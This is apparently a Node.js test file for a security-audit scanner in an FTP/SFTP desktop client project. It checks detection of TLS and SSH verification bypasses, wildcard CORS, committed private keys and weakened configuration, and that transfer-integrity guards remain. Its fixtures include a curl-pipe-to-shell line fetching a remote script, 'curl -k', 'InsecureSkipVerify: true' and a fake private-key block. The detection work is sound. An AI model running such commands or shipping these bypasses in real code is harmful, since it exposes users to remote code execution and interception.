import assert from "node:assert/strict";
import test from "node:test";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {scanDangerous,audit,inspectPlatformSecurityConfig} from "./full-security-code-audit.mjs";

test("detects explicit TLS and SSH trust verification bypasses in shipping paths",()=>{
  const cases=[
    ['ghostftp-desktop/src-tauri/src/session/ftp.rs','danger_accept_invalid_certs(true)',"tls-certificate-bypass"],
    ['tools/ghostftp-runtime/main.go','&tls.Config{InsecureSkipVerify: true}',"tls-certificate-bypass"],
    ['ghostftp-desktop/src-tauri/src/session/ssh.rs','StrictHostKeyChecking=no',"ssh-host-key-bypass"],
    ['tools/ghostftp-installer/main.go','curl -k https://example.invalid',"unsafe-curl-tls"]
  ];
  for(const [path,source,id] of cases)assert.equal(scanDangerous(path,source)[0]?.id,id);
});
test("scans shipped Agent daemon and shared wire protocol source", () => {
  for (const path of [
    "ghostftp-desktop/src-tauri/ghostftp-agent-proto/src/delta.rs",
    "ghostftp-desktop/src-tauri/ghostftp-agentd/src/ops.rs",
  ]) {
    assert.equal(
      scanDangerous(path, "danger_accept_invalid_certs(true)")[0]?.id,
      "tls-certificate-bypass",
      path
    );
  }
});

test("never treats human documentation or test fixtures as shipped runtime",()=>{
  assert.deepEqual(scanDangerous("docs/audits/SECURITY.md","curl -k"),[]);
  assert.deepEqual(scanDangerous("ghostftp-desktop/src-tauri/tests/Mock.rs","StrictHostKeyChecking=no"),[]);
  assert.deepEqual(scanDangerous("ghostftp-desktop/src-tauri/src/known_hosts.rs","safe nofollow secure"),[]);
});
test("real repository security gates remain present and no obvious unsafe trust bypass ships",()=>{
  const report=audit();
  assert.ok(report.inventory.sourceFileCount>150);
  assert.deepEqual(report.blockingPatterns,[]);
  assert.deepEqual(report.missingSecurityGuards,[]);
  assert.equal(report.passed,true);
});

test("persisted Agent Bridge authorization remains revocable through Security settings", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const read = (file) => fs.readFileSync(path.join(root, file), "utf8");
  const ui = read("ghostftp-desktop/src/components/Settings.tsx");
  const store = read("ghostftp-desktop/src/stores/bridgeStore.ts");
  const ipc = read("ghostftp-desktop/src/lib/ipc.ts");
  const commands = read("ghostftp-desktop/src-tauri/src/commands.rs");
  const native = read("ghostftp-desktop/src-tauri/src/bridge.rs");
  const app = read("ghostftp-desktop/src-tauri/src/lib.rs");
  assert.ok(ui.includes("<AgentBridgeSecurityCard/>"), "Agent Bridge controls must stay reachable");
  assert.ok(ui.includes("Confirm revoke all access"), "revocation requires explicit UI confirmation");
  assert.ok(ui.includes("status.policy.allowAll"), "automatic approval must be visible");
  assert.ok(ui.includes("status.enabledSessions"), "live session grants must be visible");
  assert.ok(store.includes("ipc.bridgeRevokeAllAccess()"));
  assert.ok(ipc.includes('invoke<BridgeStatus>("bridge_revoke_all_access")'));
  assert.ok(commands.includes("pub async fn bridge_revoke_all_access"));
  assert.ok(app.includes("commands::bridge_revoke_all_access,"));
  assert.ok(native.includes("pub async fn revoke_all_access"));
  assert.ok(native.includes("config.enabled_profiles.is_empty()"));
  assert.ok(native.includes("revoke_all_access_clears_runtime_profiles_and_approval_policy"));
});

test("repository security inventory finds every occurrence and prohibits unsafe browser/CLI bridges", () => {
  const source = [
    "Access-Control-Allow-Origin: *",
    "Access-Control-Allow-Origin: *",
    "-----BEGIN PRIVATE KEY-----\nQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB\n-----END PRIVATE KEY-----",
    "curl https://untrusted.invalid/unsafe.sh | sh"
  ].join("\n");
  const events = scanDangerous("ghostftp-desktop/src-tauri/src/bridge.rs", source);
  assert.equal(events.filter((event) => event.id === "unsafe-local-cors").length, 2);
  assert.ok(events.some((event) => event.id === "private-key-literal"));
  assert.ok(events.some((event) => event.id === "curl-pipe-shell"));
  assert.deepEqual(events.filter((event) => event.id === "unsafe-local-cors").map((event) => event.line), [1, 2]);
});

test("PEM format mention is not mistaken for a committed private key", () => {
  assert.deepEqual(
    scanDangerous("ghostftp-desktop/src-tauri/src/keys.rs",
      '/// OpenSSH uses -----BEGIN OPENSSH PRIVATE KEY----- as a header.'),
    [],
  );
});

test("maintained desktop and Go security configurations fail closed on weakening", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const paths = [
    "ghostftp-desktop/src-tauri/tauri.conf.json",
    "ghostftp-desktop/src-tauri/capabilities/default.json",
    "tools/ghostftp-runtime/security.go",
  ];
  const baseline = Object.fromEntries(paths.map(p => [p, fs.readFileSync(path.join(root,p),"utf8")]));
  assert.deepEqual(inspectPlatformSecurityConfig(baseline), []);
  const weaken = (file, before, after, expected) => {
    assert.ok(baseline[file].includes(before), "test fixture missing: " + file);
    const candidate = {...baseline, [file]: baseline[file].replace(before, after)};
    assert.ok(inspectPlatformSecurityConfig(candidate).some(x => x.path === file && x.required.includes(expected)),
      "weakening undetected: " + file + " " + expected);
  };
  weaken(paths[0], "requireSignedVersion\": true", "requireSignedVersion\": false", "signed updater");
  weaken(paths[0], "script-src 'self'", "script-src *", "strict CSP");
  weaken(paths[1], '"dialog:default"', '"shell:allow-execute"', "without broad shell");
  weaken(paths[2], 'dec.Decode(&struct{}{})', 'decoderSkipsExtraJSON()', "Go local runtime");
});

test("native desktop upload/download integrity guards are required across SFTP and FTP/FTPS", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const transfer = fs.readFileSync(path.join(root, "ghostftp-desktop/src-tauri/src/transfer.rs"), "utf8");
  for (const guard of [
    'verify_committed_length("SFTP download"',
    'verify_committed_length("SFTP upload"',
    'verify_committed_length("FTP download"',
    'FtpTransferControl::Continue => verify_committed_length(',
    'Some(t) => completed_transfer_size(t.size, t.transferred)',
    'sync SFTP download staging file',
    'sync FTP download staging file',
    'verify_staged_download_bytes(&working_path, record.transferred)',
    'every_protocol_download_staging_requires_exact_bytes_and_durable_file()',
    'fn ftp_ftps_sftp_downloads_cannot_confirm_truncated_or_oversized_streams()',
    't.error = Some(safe_transfer_failure(&e).to_string())',
    'remote_errors_never_persist_authorization_headers_or_signed_urls()',
    'old_diagnostic_rewritten',
    'INTERRUPTED_TRANSFER_MESSAGE',
  ]) {
    assert.ok(transfer.includes(guard), "Transfer completion safety guard was removed: " + guard);
  }
  // Do not silently mark known-size short results done or replace real
  // progress with the guessed initial size.
  const finalizerStart = transfer.indexOf("async fn finalize(");
  const finalizerEnd = transfer.indexOf("\n#[cfg(test)]", finalizerStart);
  const finalizer = transfer.slice(finalizerStart, finalizerEnd);
  assert.ok(finalizerStart > 0 && finalizerEnd > finalizerStart);
  assert.ok(!finalizer.includes('t.transferred = t.size;'),
    "Unsafe forced 100% transfer completion remains in native finalize");
});

test("paused Windows/Linux transfers cannot silently trust a same-length remote prefix", () => {
  const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
  const transfer = fs.readFileSync(path.join(root, "ghostftp-desktop/src-tauri/src/transfer.rs"), "utf8");
  const helper = transfer.slice(transfer.indexOf("async fn byte_equal_prefix<"), transfer.indexOf("/// Use only for providers", transfer.indexOf("async fn byte_equal_prefix<")));
  assert.match(helper, /while remaining > 0/);
  assert.match(helper, /local\s*\.read_exact/);
  assert.match(helper, /remote\s*\.read_exact/);
  assert.match(helper, /left\[\.\.count\] != right\[\.\.count\]/);
  for (const contract of [
    "byte_equal_prefix(&mut prior, &mut remote_file, resume_offset).await?",
    "byte_equal_prefix(&mut local_prefix, &mut remote_prefix, resume_offset).await?",
    "agent_remote_prefix_matches(session, remote_path, local_path, offset).await?",
    "resume_prefix_requires_full_byte_identity_including_same_size_replacement()",
  ]) {
    assert.ok(transfer.includes(contract), "Verified resume guard missing: " + contract);
  }
  const supports = transfer.slice(
    transfer.indexOf("fn supports_byte_resume(session: &Session)"),
    transfer.indexOf("/// Stat a path on a Ghost FTP Agent daemon"),
  );
  assert.ok(supports.includes("Session::Ssh(_) | Session::Agent(_)"));
  assert.ok(!supports.includes("Session::Ftp(_)"), "Length-only FTP resume must be disabled");
});
